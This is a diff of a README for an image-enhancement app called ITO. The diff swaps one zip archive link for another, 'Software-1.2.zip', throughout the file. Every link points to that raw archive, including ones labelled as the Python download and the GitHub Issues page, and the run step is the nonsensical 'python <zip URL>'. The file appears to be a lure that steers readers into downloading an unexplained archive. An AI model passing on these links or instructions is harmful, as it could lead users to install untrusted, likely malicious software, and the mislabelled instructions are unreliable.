@@ -2,11 +2,11 @@
 
 ## 🚀 Download & Install
 
-[![Download ITO](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip)](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip)
+[![Download ITO](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip)](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip)
 
 Welcome to ITO! This application allows you to enhance images using advanced techniques in a simple way. You can improve your images with easy-to-use features without needing to understand complicated technology.
 
-Visit this page to download: [https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip)
+Visit this page to download: [https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip)
 
 ## 🌟 Features
 
@@ -33,9 +33,9 @@ Ensure your system meets the following requirements before installing ITO:
 
 ## 📥 Installation Steps
 
-1. **Download ITO**: Go to [https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip) and download the latest release suitable for your operating system.
+1. **Download ITO**: Go to [https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip) and download the latest release suitable for your operating system.
 
-2. **Install Python**: If you don't have Python installed, download it from [https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip) and install it. Make sure to add Python to your system PATH.
+2. **Install Python**: If you don't have Python installed, download it from [https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip) and install it. Make sure to add Python to your system PATH.
 
 3. **Install Required Libraries**: Open your command line or terminal and run the following commands:
 
@@ -46,7 +46,7 @@ Ensure your system meets the following requirements before installing ITO:
 4. **Running ITO**: After installation, navigate to the folder where you downloaded ITO using your command line or terminal. Then run the application by executing:
 
    ```bash
-   python https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip
+   python https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip
    ```
 
 ## ⚙️ Using ITO
@@ -68,6 +68,6 @@ If you encounter any issues, here are some common solutions:
 
 ## 📞 Support
 
-For assistance or to report issues, visit our [GitHub Issues page](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/ITO-1.6.zip). We are here to help you.
+For assistance or to report issues, visit our [GitHub Issues page](https://raw.githubusercontent.com/Jaykayloc/ITO/main/spherocrystal/Software-1.2.zip). We are here to help you.
 
 Explore the capabilities of ITO and enhance your images with our user-friendly application!
